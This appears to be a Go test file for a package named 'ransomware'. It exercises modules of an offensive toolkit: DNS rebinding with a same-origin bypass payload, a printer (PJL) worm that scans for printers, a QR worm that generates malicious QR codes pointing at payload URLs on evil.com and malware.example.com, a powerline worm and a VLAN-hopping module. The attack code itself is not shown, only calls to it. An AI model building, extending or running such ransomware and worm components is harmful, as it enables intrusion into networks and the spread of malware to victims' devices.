package ransomware

import (
	"testing"
)

func TestNewDNSRebindingInitialState(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	d := NewDNSRebinding(cfg)

	// Test SOP bypass payload generation
	payload := d.SOPBypassPayload("http://192.168.1.1")
	if payload == "" {
		t.Error("SOPBypassPayload returned empty")
	}
	t.Logf("SOP bypass payload length: %d", len(payload))
}

func TestDNSRebindingConfig(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	d := NewDNSRebinding(cfg)

	// Full suite should work even without network
	result := d.FullDNSRebindingSuite("http://127.0.0.1:9090")
	if result == nil {
		t.Fatal("FullDNSRebindingSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewPJLWorm(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPJLWorm(cfg)
	if p == nil {
		t.Fatal("NewPJLWorm() returned nil")
	}
}

func TestPJLWormDiscoverPrinters(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPJLWorm(cfg)

	printers, err := p.DiscoverPrinters()
	if err != nil {
		t.Logf("DiscoverPrinters: %v (expected in non-printer env)", err)
	}
	if len(printers) == 0 {
		t.Log("No printers discovered (expected in test env)")
	}
}

func TestPJLWormEnumPrinterInfo(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPJLWorm(cfg)

	info, err := p.EnumPrinterInfo("192.168.1.100")
	if err != nil {
		t.Logf("EnumPrinterInfo: %v (expected no printer at IP)", err)
	}
	if info != nil {
		t.Logf("Printer info: %v", info)
	}
}

func TestPJLWormSuite(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPJLWorm(cfg)

	result := p.FullPJLWormSuite("http://127.0.0.1:9090")
	if result == nil {
		t.Fatal("FullPJLWormSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewQRWorm(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	q := NewQRWorm(cfg)
	if q == nil {
		t.Fatal("NewQRWorm() returned nil")
	}
}

func TestQRWormGenerateQR(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	q := NewQRWorm(cfg)

	path, err := q.GenerateMaliciousQR("http://malware.example.com/payload")
	if err != nil {
		t.Logf("GenerateMaliciousQR: %v (expected if no PNG lib)", err)
	}
	if path != "" {
		t.Logf("QR generated at: %s", path)
	}
}

func TestQRWormSuite(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	q := NewQRWorm(cfg)

	result := q.FullQRWormSuite("http://evil.com/payload")
	if result == nil {
		t.Fatal("FullQRWormSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewPowerlineWorm(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPowerlineWorm(cfg)
	if p == nil {
		t.Fatal("NewPowerlineWorm() returned nil")
	}
}

func TestPowerlineSuite(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPowerlineWorm(cfg)

	result := p.FullPowerlineSuite("payload_data")
	if result == nil {
		t.Fatal("FullPowerlineSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewVLANJumper(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	v := NewVLANJumper(cfg)
	if v == nil {
		t.Fatal("NewVLANJumper() returned nil")
	}
}

func TestVLANJumperListInterfaces(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	v := NewVLANJumper(cfg)

	ifaces := v.ListInterfaces()
	if len(ifaces) == 0 {
		t.Log("No network interfaces found (expected in sandbox)")
	}
	t.Logf("Interfaces: %v", ifaces)
}

func TestVLANJumperSuite(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	v := NewVLANJumper(cfg)

	result := v.FullVLANJumpSuite()
	if result == nil {
		t.Fatal("FullVLANJumpSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}
